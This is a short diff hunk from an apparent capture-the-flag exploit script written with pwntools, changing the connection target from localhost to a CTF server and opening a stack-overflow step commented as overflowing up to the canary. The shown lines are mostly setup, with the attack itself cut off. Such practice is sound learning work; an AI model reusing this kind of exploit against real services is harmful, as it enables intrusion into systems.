@@ -10,7 +10,7 @@ def main():
     context(arch="amd64")
     vuln = ELF("vuln")
 
-    conn = remote("localhost", 1337)
+    conn = remote("ctf.dscmunich.de", 10002)
 
     # Overflow until canary
     conn.recvuntil(b"Exit\n")
